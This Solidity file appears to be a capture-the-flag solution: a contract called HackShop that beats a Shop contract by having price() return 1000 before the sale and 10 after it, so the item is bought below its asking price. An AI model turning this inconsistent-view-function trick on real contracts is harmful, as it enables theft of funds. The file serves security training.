// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Shop.sol";

contract HackShop is Buyer {
    Shop public shop;

    constructor(Shop _shop) public {
        shop = _shop;
    }

    function buy() external{
        shop.buy();
    }

    function price() external view override returns (uint256) {
        bool isSold = shop.isSold();
        if (isSold) {
            return 10;
        }
        return 1000;
    }
}
